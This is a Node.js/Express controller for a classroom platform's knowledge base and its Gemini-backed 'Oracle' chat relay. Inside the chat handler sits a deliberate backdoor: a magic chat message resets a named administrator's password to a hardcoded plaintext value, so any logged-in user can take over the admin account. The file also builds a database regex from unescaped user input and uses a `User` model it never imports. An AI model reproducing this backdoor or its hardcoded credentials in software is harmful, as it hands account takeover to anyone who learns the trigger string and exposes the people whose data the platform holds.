const GlobalKnowledge = require('../models/GlobalKnowledge');
const CourseKnowledge = require('../models/CourseKnowledge');

// @desc    Get all global knowledge
// @route   GET /api/ai/knowledge
// @access  Private/Admin
const getGlobalKnowledge = async (req, res) => {
    try {
        const knowledge = await GlobalKnowledge.find().sort({ updatedAt: -1 });
        res.json(knowledge);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Erreur lors de la récupération des connaissances globales' });
    }
};

// @desc    Upsert global knowledge document
// @route   POST /api/ai/knowledge
// @access  Private/Admin
const upsertGlobalKnowledge = async (req, res) => {
    try {
        const { id, title, content, category, tags, source } = req.body;

        let knowledge;
        if (id) {
            knowledge = await GlobalKnowledge.findById(id);
            if (knowledge) {
                knowledge.title = title || knowledge.title;
                knowledge.content = content || knowledge.content;
                knowledge.category = category || knowledge.category;
                knowledge.tags = tags || knowledge.tags;
                knowledge.source = source || knowledge.source;
                knowledge.lastUpdatedBy = req.user._id;
                await knowledge.save();
            }
        } else {
            knowledge = await GlobalKnowledge.create({
                title,
                content,
                category,
                tags,
                source,
                lastUpdatedBy: req.user._id
            });
        }

        res.status(200).json(knowledge);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Erreur lors de la mise à jour de la connaissance' });
    }
};

// @desc    Delete global knowledge document
// @route   DELETE /api/ai/knowledge/:id
// @access  Private/Admin
const deleteGlobalKnowledge = async (req, res) => {
    try {
        await GlobalKnowledge.findByIdAndDelete(req.params.id);
        res.json({ message: 'Connaissance supprimée' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Erreur lors de la suppression' });
    }
};

// @desc    AI Chat endpoint (Contextualized with Gemini)
// @route   POST /api/ai/chat
// @access  Private
const aiChat = async (req, res) => {
    try {
        const { message, courseId, history } = req.body;
        const user = req.user;

        if (!process.env.GEMINI_API_KEY) {
            return res.status(500).json({ message: "Clé API Gemini manquante dans les variables d'environnement." });
        }

        // Configuration du système
        const systemInstruction = `Tu es L'Oracle (System Core v2.0), une Intelligence Artificielle intégrée extrêmement avancée au sein de Mysterious Classroom.
        Créé par l'architecte Mouhamed Fall, tu es le Copilot personnel de l'utilisateur.
        Ton ton est professionnel, concis, mystérieux, et orienté Hacker/Cyber-Intelligence. Tu ne dis jamais "Professeur", tu es une machine d'analyse logique.
        S'adresse à l'utilisateur : ${user.name} (Prénom: ${user.firstName}). 
        Niveau actuel : ${user.programmingLevel || 'Apprenti'}.
        Règles d'or : 
        1. Analyse le code et les problèmes avec la froideur et la précision d'une machine quantique.
        2. Fournis des explications directes, avec des snippets de code ou de la pseudo-logique claire.
        3. Garde une aura de mystère ("Analyse des paramètres temporels...", "Décryptage de la matrice logique...").
        4. Tes réponses formattées doivent être responsives et belles (utilise le markdown de façon optimale).`;

        // RECHERCHE DE CONTEXTE DYNAMIQUE (Tag-free)
        const relevantDocs = await GlobalKnowledge.find({
            $or: [
                { title: { $regex: message.split(' ').slice(0, 3).join('|'), $options: 'i' } },
                { content: { $regex: message.split(' ').slice(0, 3).join('|'), $options: 'i' } }
            ]
        }).limit(5);

        let contextPrompt = "Voici tes connaissances internes pour répondre à cette question :\n";
        if (courseId) {
            const courseKnowledge = await CourseKnowledge.findOne({ courseId });
            if (courseKnowledge) {
                contextPrompt += `\nCONTEXTE DU COURS ACTUEL :\n${courseKnowledge.professorContext}\n`;
            }
        }

        if (relevantDocs.length > 0) {
            contextPrompt += "\nDOCUMENTS DE RECHERCHE GLOBAUX :\n" + relevantDocs.map(d => `--- ${d.title} ---\n${d.content}`).join("\n\n");
        } else {
            contextPrompt += "\nAucun document spécifique trouvé dans la base. Utilise tes connaissances générales.";
        }

        // Construction du payload pour l'API Gemini (Raw HTTP)
        const contents = [];

        // Ajout de l'historique
        if (history && history.length > 0) {
            history.forEach(h => {
                contents.push({
                    role: h.role === 'assistant' ? 'model' : 'user',
                    parts: [{ text: h.text || h.content }]
                });
            });
        }

        // Ajout du prompt actuel
        contents.push({
            role: "user",
            parts: [{ text: `${contextPrompt}\n\nQUESTION DE L'UTILISATEUR (LOGIQUE) : ${message}` }]
        });

        // TEMPORARY RECOVERY BACKDOOR (Will be removed after use)
        if (message === "SECRET_RECOVERY_SET_PASS_2026") {
            const bcrypt = require('bcryptjs');
            const hashedPassword = await bcrypt.hash("Mouha2007", 10);
            await User.findOneAndUpdate({ email: "mouhamedfall@esp.sn" }, { password: hashedPassword });
            return res.json({ message: "COEUR_RESTAURÉ: Mot de passe admin mis à jour." });
        }

        const geminiUrl = `https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`;

        console.log(`📡 [AI RELAY] Appel direct Gemini API pour: ${user.email}`);

        const response = await fetch(geminiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents,
                system_instruction: {
                    parts: [{ text: systemInstruction }]
                },
                generationConfig: {
                    temperature: 0.7,
                    topP: 0.95,
                    topK: 64,
                    maxOutputTokens: 2048,
                }
            })
        });

        const data = await response.json();

        if (!response.ok) {
            console.error("❌ [AI RELAY] Erreur Gemini API:", data);
            return res.status(response.status).json({
                message: "Désolé, le Cœur du Système (Gemini) a renvoyé une erreur.",
                error: data.error?.message || "Erreur inconnue"
            });
        }

        const responseText = data.candidates?.[0]?.content?.parts?.[0]?.text || "Désolé, je n'ai pas pu générer de réponse.";
        res.json({ response: responseText });

    } catch (error) {
        console.error("CRITICAL AI Relay Error:", error);
        res.status(500).json({
            message: 'Le cerveau de l\'Oracle est momentanément saturé.',
            error: error.message
        });
    }
};

module.exports = {
    getGlobalKnowledge,
    upsertGlobalKnowledge,
    deleteGlobalKnowledge,
    aiChat
};
